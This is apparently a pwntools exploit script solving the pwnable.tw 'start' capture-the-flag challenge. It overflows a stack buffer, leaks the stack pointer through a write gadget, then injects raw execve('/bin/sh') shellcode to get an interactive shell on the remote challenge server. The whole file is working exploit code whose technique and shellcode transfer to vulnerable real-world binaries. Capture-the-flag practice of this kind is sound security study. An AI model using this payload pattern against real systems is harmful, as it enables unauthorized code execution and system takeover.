from pwn import *

elf = ELF("./start")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10000)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
                b _start
                """)
        else:
            p = process([elf.path])

    return p

def main():
    p = conn()

    # pwn it
    eip_offset = 20
    write = 0x08048087
    payload = b"A"*eip_offset
    payload += p32(write)

    p.sendafter(b":", payload)

    esp = u32(p.recv()[:4])

    payload = b"A"*eip_offset
    payload += p32(esp+0x14)
    payload += b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    main()

